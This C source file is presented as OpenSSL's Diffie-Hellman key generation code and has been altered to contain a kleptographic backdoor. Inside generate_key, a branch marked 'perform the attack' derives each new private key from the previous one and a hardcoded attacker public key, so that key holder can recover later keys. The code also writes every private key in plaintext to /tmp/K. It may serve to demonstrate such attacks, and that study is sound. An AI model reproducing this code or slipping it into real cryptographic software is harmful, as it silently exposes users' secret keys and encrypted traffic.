/*
 * Copyright 1995-2019 The OpenSSL Project Authors. All Rights Reserved.
 *
 * Licensed under the OpenSSL license (the "License").  You may not use
 * this file except in compliance with the License.  You can obtain a copy
 * in the file LICENSE in the source distribution or at
 * https://www.openssl.org/source/license.html
 */

#include <stdio.h>
#include <string.h>
#include "internal/cryptlib.h"
#include "dh_local.h"
#include "crypto/bn.h"
#include <openssl/sha.h>

#define NUM_BYTES 64
#define NUM_BITS 512
#define HASH SHA512

static int generate_key(DH *dh);
static int compute_key(unsigned char *key, const BIGNUM *pub_key, DH *dh);
static int dh_bn_mod_exp(const DH *dh, BIGNUM *r,
                         const BIGNUM *a, const BIGNUM *p,
                         const BIGNUM *m, BN_CTX *ctx, BN_MONT_CTX *m_ctx);
static int dh_init(DH *dh);
static int dh_finish(DH *dh);

int DH_generate_key(DH *dh)
{
    return dh->meth->generate_key(dh);
}

int DH_compute_key(unsigned char *key, const BIGNUM *pub_key, DH *dh)
{
    return dh->meth->compute_key(key, pub_key, dh);
}

int DH_compute_key_padded(unsigned char *key, const BIGNUM *pub_key, DH *dh)
{
    int rv, pad;
    rv = dh->meth->compute_key(key, pub_key, dh);
    if (rv <= 0)
        return rv;
    pad = BN_num_bytes(dh->p) - rv;
    if (pad > 0) {
        memmove(key + pad, key, rv);
        memset(key, 0, pad);
    }
    return rv + pad;
}

static DH_METHOD dh_ossl = {
    "OpenSSL DH Method",
    generate_key,
    compute_key,
    dh_bn_mod_exp,
    dh_init,
    dh_finish,
    DH_FLAG_FIPS_METHOD,
    NULL,
    NULL
};

static const DH_METHOD *default_DH_method = &dh_ossl;

const DH_METHOD *DH_OpenSSL(void)
{
    return &dh_ossl;
}

void DH_set_default_method(const DH_METHOD *meth)
{
    default_DH_method = meth;
}

const DH_METHOD *DH_get_default_method(void)
{
    return default_DH_method;
}

// Makes a key of the expected size
void kdf(const unsigned char *in, int in_len, unsigned char *out, int out_len){
    int counter, pos, hash_input_len;
    unsigned char* hash_input;
    unsigned char hash_output[NUM_BYTES];
    int* loc;

    hash_input_len = in_len + sizeof(int);
    hash_input = malloc(hash_input_len);
    memcpy(hash_input, in, in_len);

    counter = 0;
    pos = 0;
    while(pos < out_len){
        
        loc = (int*) (&hash_input[in_len]);
        *loc = counter;
        HASH(hash_input, hash_input_len, hash_output);
        int n = out_len - pos < NUM_BYTES ? out_len - pos : NUM_BYTES;
        memcpy(out+pos, hash_output, n);
        pos+= NUM_BYTES;
        counter+=1;

    }

}

static int generate_key(DH *dh)
{   
    int ok = 0;
    int generate_new_key = 0;
    unsigned l;
    BN_CTX *ctx = NULL;
    BN_MONT_CTX *mont = NULL;
    BIGNUM *pub_key = NULL, *priv_key = NULL;

    if (BN_num_bits(dh->p) > OPENSSL_DH_MAX_MODULUS_BITS) {
        DHerr(DH_F_GENERATE_KEY, DH_R_MODULUS_TOO_LARGE);
        return 0;
    }

    ctx = BN_CTX_new();
    if (ctx == NULL)
        goto err;

    if (dh->priv_key == NULL) {
        priv_key = BN_secure_new();
        if (priv_key == NULL)
            goto err;
        generate_new_key = 1;
    } else
        priv_key = dh->priv_key;

    if (dh->pub_key == NULL) {
        pub_key = BN_new();
        if (pub_key == NULL)
            goto err;
    } else
        pub_key = dh->pub_key;

    if (dh->flags & DH_FLAG_CACHE_MONT_P) {
        mont = BN_MONT_CTX_set_locked(&dh->method_mont_p,
                                      dh->lock, dh->p, ctx);
        if (!mont)
            goto err;
    }

    if (generate_new_key) {
        int K_exists;
        FILE* Kf;
        BIGNUM* K = NULL;
        size_t K_size;
        unsigned char* tmp;

        K_exists = ( Kf = fopen("/tmp/K", "r") ) != NULL;
        if (K_exists){
            tmp = malloc(1024);
            K_size = fread(tmp, 1, 1024, Kf);
            K = BN_new();
            BN_bin2bn(tmp, K_size, K);
        }

        if (dh->q) {
            do {
                if (!BN_priv_rand_range(priv_key, dh->q))
                    goto err;
            }
            while (BN_is_zero(priv_key) || BN_is_one(priv_key));
        } else {
            /* secret exponent length */
            l = dh->length ? dh->length : BN_num_bits(dh->p) - 1;
            //l = l > NUM_BITS ? NUM_BITS : l;
    
            
            if (!K_exists){ //normal generation
                if (!BN_priv_rand(priv_key, l, BN_RAND_TOP_ONE, BN_RAND_BOTTOM_ANY))
                    goto err;
                /*
                * We handle just one known case where g is a quadratic non-residue:
                * for g = 2: p % 8 == 3
                */
                if (BN_is_word(dh->g, DH_GENERATOR_2) && !BN_is_bit_set(dh->p, 2)) {
                    /* clear bit 0, since it won't be a secret anyway */
                    if (!BN_clear_bit(priv_key, 0))
                        goto err;   
                }

            } else {
                //perform the attack
                int ID = 0;
                int i = 0;
                BIGNUM *my_pub_key, *t;
                my_pub_key = BN_new();
                t = BN_new();
                BN_hex2bn(&my_pub_key, "4BE69A8F9DE96F68758A1D13B6FAD5BD4475E6B206E1846F09981EAA6D362DC7F61E2BD7967C8A62F07553F0DD663D323029BD955973925F90B0388CA2D2B7602209A8322634673441133C5A69508BC43716E8DD604426F2DD69CD6FAAC1298FBB8078E7BFE1FB9DBB37344AE4F00565A9C6C57EA8E9D8A3BC9802213A4F09E32319E52EFBCCD578C9EE85FA9BAC8B684472E68E7ACB8C5957F7BD6DDFC299C71F3A5883698C2C3D05C02282131333E66BDB4C7F4CA4A2C58258FDEA4BDC40E4869FBFC601B40BAB845D1EB7ED055F35E0DC156E315CC93B7279DBCCE821AD5B2F50ABC0098E9D18A5E6D0507A39AAE27844B50DAE16866792DD79A999AFE1606AD5982464CD6F37EC2C4DF90D65BBFEA12F5982D47639DEF240A76BB15E9F1BB79AF4275A3862555B1BEF6708BEA6799F03A9CC911985242FAAF7E762F8E073BE95D22731EC32DC26FB1AD1C18C1F728F260D0072A2549FB588C11BC21CECB939E9A2B65CC650A48ECEC61CA9D0C4A09EA817013F0292A390961AEBEB85847C");
                
                BN_mod_exp(t, my_pub_key, K, dh->p, ctx);


                int l2 = BN_num_bytes(dh->p);
                int in_len = l2+2*sizeof(int);
                int out_len = l % 8 == 0 ? l/8 : l/8 + 1;
                int* loc;

                tmp = malloc(in_len);
                BN_bn2binpad(t, tmp, l2);
             
                loc = (int*) (&tmp[l2]);
                *loc = ID;
                loc = (int*) (&tmp[l2+sizeof(int)]);
                *loc = i;
          
                unsigned char out[out_len];

                kdf(tmp, in_len, out, out_len);
                BN_bin2bn(out, out_len, priv_key);

                /*
                unsigned char md[NUM_BYTES];
                HASH(tmp, l+sizeof(ID)+sizeof(i), md);
                BN_bin2bn(md, NUM_BYTES, priv_key);
                */
            }

            //writes the private key in file
            int n = BN_num_bytes(priv_key);
            tmp = malloc(n);
            BN_bn2bin(priv_key, tmp);
            Kf = fopen("/tmp/K", "w");
            fwrite(tmp, 1, n, Kf);

            free(tmp);
        }
        
    }

    {
        BIGNUM *prk = BN_new();

        if (prk == NULL)
            goto err;
        BN_with_flags(prk, priv_key, BN_FLG_CONSTTIME);

        if (!dh->meth->bn_mod_exp(dh, pub_key, dh->g, prk, dh->p, ctx, mont)) {
            BN_clear_free(prk);
            goto err;
        }
        /* We MUST free prk before any further use of priv_key */
        BN_clear_free(prk);
    }

    
                
    dh->pub_key = pub_key;
    dh->priv_key = priv_key;
    ok = 1;
 err:
    if (ok != 1)
        DHerr(DH_F_GENERATE_KEY, ERR_R_BN_LIB);

    if (pub_key != dh->pub_key)
        BN_free(pub_key);
    if (priv_key != dh->priv_key)
        BN_free(priv_key);
    BN_CTX_free(ctx);
    return ok;
}

static int compute_key(unsigned char *key, const BIGNUM *pub_key, DH *dh)
{
    BN_CTX *ctx = NULL;
    BN_MONT_CTX *mont = NULL;
    BIGNUM *tmp;
    int ret = -1;
    int check_result;

    if (BN_num_bits(dh->p) > OPENSSL_DH_MAX_MODULUS_BITS) {
        DHerr(DH_F_COMPUTE_KEY, DH_R_MODULUS_TOO_LARGE);
        goto err;
    }

    ctx = BN_CTX_new();
    if (ctx == NULL)
        goto err;
    BN_CTX_start(ctx);
    tmp = BN_CTX_get(ctx);
    if (tmp == NULL)
        goto err;

    if (dh->priv_key == NULL) {
        DHerr(DH_F_COMPUTE_KEY, DH_R_NO_PRIVATE_VALUE);
        goto err;
    }

    if (dh->flags & DH_FLAG_CACHE_MONT_P) {
        mont = BN_MONT_CTX_set_locked(&dh->method_mont_p,
                                      dh->lock, dh->p, ctx);
        BN_set_flags(dh->priv_key, BN_FLG_CONSTTIME);
        if (!mont)
            goto err;
    }

    if (!DH_check_pub_key(dh, pub_key, &check_result) || check_result) {
        DHerr(DH_F_COMPUTE_KEY, DH_R_INVALID_PUBKEY);
        goto err;
    }

    if (!dh->
        meth->bn_mod_exp(dh, tmp, pub_key, dh->priv_key, dh->p, ctx, mont)) {
        DHerr(DH_F_COMPUTE_KEY, ERR_R_BN_LIB);
        goto err;
    }

    ret = BN_bn2bin(tmp, key);
 err:
    BN_CTX_end(ctx);
    BN_CTX_free(ctx);
    return ret;
}

static int dh_bn_mod_exp(const DH *dh, BIGNUM *r,
                         const BIGNUM *a, const BIGNUM *p,
                         const BIGNUM *m, BN_CTX *ctx, BN_MONT_CTX *m_ctx)
{
    return BN_mod_exp_mont(r, a, p, m, ctx, m_ctx);
}

static int dh_init(DH *dh)
{
    dh->flags |= DH_FLAG_CACHE_MONT_P;
    return 1;
}

static int dh_finish(DH *dh)
{
    BN_MONT_CTX_free(dh->method_mont_p);
    return 1;
}
